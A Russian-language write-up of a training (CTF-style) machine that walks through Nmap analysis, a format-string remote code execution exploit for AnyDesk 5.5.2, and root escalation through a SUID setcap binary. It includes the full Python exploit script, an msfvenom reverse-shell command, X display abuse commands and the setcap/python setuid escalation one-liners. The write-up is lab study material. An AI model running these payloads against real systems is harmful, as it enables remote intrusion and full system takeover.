#### Детальный разбор вывода Nmap

Для полного понимания картины разберем полученные данные:

**1. Порт 22 (SSH)**
- `syn-ack`: порт ответил согласием на установку TCP-соединения.
- `ttl 62` (Time To Live): по умолчанию в Linux TTL равен 64. Значение 62 указывает на то, что пакет прошел через 2 маршрутизатора (хопа), и на целевой стороне установлена ОС на базе Linux.
- `OpenSSH 7.6p1 Ubuntu 4ubuntu0.6`: версия `4ubuntu0.6` соответствует Ubuntu 18.04. Это устаревшая система (состояние End Of Life наступило в 2023 году).
- `ssh-hostkey`: публичные ключи сервера. По ним можно идентифицировать хост и убедиться, что он не является клоном другой системы в сети.

**2. Порт 7070 (ssl/realserver?)**
- Nmap определил наличие SSL-шифрования, но не смог точно идентифицировать службу из-за отсутствия точного совпадения в базе сигнатур.
- `Subject: commonName=AnyDesk Client`: данные сертификата прямо указывают на то, что целевой службой является **AnyDesk** (утилита для удаленного управления рабочим столом).
- `Public Key type: rsa / bits: 2048`: стандартная криптография.
- `Not valid before: 2022 / Not valid after: 2072`: самоподписанный сертификат сроком на 50 лет. Это стандартная практика для подобного программного обеспечения.

**3. Порт 33281 (unknown)**
- `STATE: open`: порт открыт, но служба не распознана.
- `fingerprint-strings`: Nmap отправил пустой запрос (`NULL`), на что сервер ответил бинарными данными (`^A]5`, `f$N5`, `kr;$`, `\xdePz`). 
- Учитывая наличие AnyDesk, этот порт с высокой долей вероятности является вспомогательным каналом связи (P2P или Discovery).
- `SF-Port33281-TCP:V=7.99...`: так как Nmap не смог распознать отпечаток (`SF`), он вывел "сырой" дамп данных в шестнадцатеричном формате.

> **Дополнительная проверка портов**
> 
> Попытка ручного подключения через `ncat` к 7070 или 33281 порту возвращает ошибку `input/output error`. Это связано с тем, что служба ожидает данные в специфическом проприетарном протоколе. `ncat` открывает TCP-соединение и либо ничего не отправляет, либо отправляет нерелевантные данные, из-за чего сервер принудительно разрывает соединение (TCP RST).
> 
> Попытка подключения с использованием SSL:
> `sudo openssl s_client -connect 10.112.178.192:7071`
> *(Порт 7071 выбран, так как AnyDesk может переключаться между портами 7070 и 7071 при перезапусках или зависаниях)*.
> Возвращается ошибка: `packet length too long, record layer failure`. Это указывает на то, что реализация шифрования отличается от стандартного TLS.

### Эксплуатация AnyDesk (Уязвимость Format String)

Так как целевой службой является AnyDesk, производим поиск известных уязвимостей:

```bash
searchsploit anydesk                               
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
AnyDesk 5.5.2 - Remote Code Execution                                   | linux/remote/49613.py
```

Узнать точную версию AnyDesk на сервере невозможно, поэтому действуем "вслепую". Однако версия ОС (Ubuntu 18.04) хорошо соотносится с датой выпуска эксплойта, что повышает шансы на успех. Модуль в Metasploit Framework оказался нерабочим и возвращал ошибку при запуске, поэтому эксплойт был адаптирован и запущен вручную.

```python
#!/usr/bin/env python
import struct
import socket
import sys

ip = 'ip'
port = 50001 # Стандартный UDP-порт для AnyDesk. Предварительно рекомендуется проверить: sudo nmap -sU -p 50001,50002,50003 10.112.139.204

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b"" # Здесь вставляется полезная нагрузка, сгенерированная через msfvenom

print('Sending payload...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('Reverse shell should connect within 5 seconds')
```

Скрипт запускается через `python2`. 
*Важное примечание: эксплойт чувствителен к ошибкам. Неправильно сформированный пакет вызовет `segmentation fault` (ошибку доступа к памяти) и процесс AnyDesk завершит свою работу аварийно. Подключиться повторно не удастся без перезагрузки целевой машины.*

#### Механика работы эксплойта

Уязвимость классифицируется как **Format String Vulnerability** (Уязвимость форматной строки). Процесс эксплуатации состоит из следующих этапов:

1. **Использование протокола обнаружения (Discovery):** Скрипт формирует сетевой пакет, имитирующий стандартное приветствие от другого клиента AnyDesk. Пакет включает в себя ID клиента, тип ОС, имя пользователя и `hostname` (имя компьютера).
2. **Уязвимость в обработчике:** При получении пакета AnyDesk логирует присланные данные. Ошибка кроется в использовании функции логирования без жестко заданного формата:
   ```c
   // Уязвимая реализация:
   printf(received_hostname);
   
   // Безопасная реализация:
   printf("User detected: %s", received_hostname); 
   ```
   Из-за этого символы `%` в строке `received_hostname` воспринимаются функцией `printf` как спецификаторы формата.
3. **Манипуляция стеком:** В поле `hostname` передается строка `%1$*1$x%18x%165$ln`. Символ `%` заставляет функцию читать данные из стека процесса (где лежат адреса возврата и переменные). Число `165` является оффсетом (смещением) — оно указывает на конкретную ячейку в стеке, содержащую целевой адрес памяти.
4. **Запись в память через `%n`:** Спецификатор `%n` (или `%ln` для `long`) является уникальным: вместо чтения он *записывает* количество символов, выведенных `printf` до текущего момента, по адресу из стека. Манипулируя количеством выводимых пробелов/символов (с помощью `%18x`), эксплойт подгоняет сумму так, чтобы она точно соответствовала адресу подготовленного шелл-кода. В результате происходит перезапись целевого указателя (чаще всего адреса возврата функции или записи в Global Offset Table - GOT).
5. **Перехват потока выполнения (Control Flow Hijacking):** По завершении работы функции приложение считывает перезаписанный адрес возврата и передает управление по этому адресу. Процессор начинает выполнять инструкции нашего шелл-кода.
6. **Выполнение шелл-кода:** Шелл-код, сгенерированный через `msfvenom`, выполняет системные вызовы (syscall) для создания сетевого сокета, подключения к IP-адресу атакующего, перенаправления стандартных потоков ввода/вывода (STDIN, STDOUT, STDERR) в этот сокет и запуска командной оболочки `/bin/sh`.

### Повышение привилегий (Root)

Для автоматизации поиска векторов повышения привилегий загружаем и запускаем скрипт `LinPEAS`. Вывод скрипта подсветил несколько интересных системных настроек и процессов.

#### Анализ системной конфигурации (Заметки)

В рамках глубокого анализа системы рассмотрим две примечательные находки LinPEAS:

**1. Процесс Xvfb от root:**
```text
root       439  0.0  6.1 511952 28880 ?        Sl   11:44   0:00  _ /usr/bin/Xvfb :10 -ac -screen 0 1024x768x24
```
Здесь критически важен флаг `-ac` (Disable Access Control). По умолчанию для подключения к X-серверу (графическому дисплею) требуется авторизация через файл `.Xauthority`. Флаг `-ac` отключает этот контроль: любой локальный пользователь может подключиться к виртуальному экрану `:10` без пароля.
*(Примечание: AnyDesk часто самостоятельно запускает Xvfb на headless-серверах (без монитора), чтобы иметь возможность транслировать изображение).*
Что это дает атакующему:
- Скриншот экрана: `xwd -display :10 -root -out screen.xwd`
- Перехват нажатий клавиш (keylogging) через утилиту `xinput`.
- Инъекция нажатий клавиш: `export DISPLAY=:10; xdotool key Return`.
Для данной тренировочной машины этот вектор развития не получил, но в реальных сценариях это критичная уязвимость.

**2. Настройка сети rp_filter:**
```text
net.ipv4.conf.all.rp_filter = 1
```
`rp_filter` (Reverse Path Filter) — это механизм защиты от IP Spoofing. При получении пакета ядро проверяет Source IP (адрес отправителя). Оно смотрит в таблицу маршрутизации: "Если бы я отправлял ответ на этот IP, через какой сетевой интерфейс он бы ушел?". Если ожидаемый интерфейс совпадает с тем, через который пакет пришел — пакет принимается. В противном случае (пакет пришел через `eth0`, но по маршрутам ответ должен идти через `tun0`) — пакет признается подделанным и отбрасывается (Drop).
- `0`: фильтр выключен.
- `1`: Strict Mode (наш случай) — строгая проверка. Наиболее безопасная конфигурация.
- `2`: Loose Mode — мягкая проверка. Проверяет лишь наличие хоть какого-то маршрута к отправителю.
*Значимость находки:* Данная настройка (Hardening) блокирует классические атаки Man-in-the-Middle и попытки внедрения пакетов с поддельным Source IP внутри сети. Кроме того, это существенно усложняет пивотинг (туннелирование) — использование взломанной машины в качестве шлюза для атак на другие внутренние сегменты.

#### Применение Capabilities для повышения привилегий

Вернемся к эксплуатации. В списке файлов с установленным SUID-битом обнаруживаем бинарный файл:

```text
-rwsr-xr-x 1 root root 10K Nov 16  2017 /sbin/setcap
```

Утилита `/sbin/setcap` предназначена для управления механизмами Capabilities — детального разграничения привилегий в Linux. Так как у файла стоит SUID-бит, мы можем запускать `setcap` от имени пользователя `root`, что позволяет нам назначить любые Capabilities любому исполняемому файлу в системе.

Для ознакомления с синтаксисом утилиты бинарник был загружен на атакующую машину и декомпилирован в Ghidra:

<img width="1559" height="222" alt="image" src="https://github.com/user-attachments/assets/72f62006-3d25-4f1b-b75c-0ac67dd808c0" />

Изучив синтаксис, мы можем выдать привилегию `cap_setuid` исполняемому файлу интерпретатора Python. Привилегия `cap_setuid+ep` (Effective, Permitted) позволяет программе динамически изменять свой UID, в том числе становиться root'ом (UID 0), без необходимости назначать SUID-бит самому Python.

Выполняем повышение привилегий:

```bash
annie@desktop:/home/annie$ setcap cap_setuid+ep /usr/bin/python3
annie@desktop:/home/annie$ /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
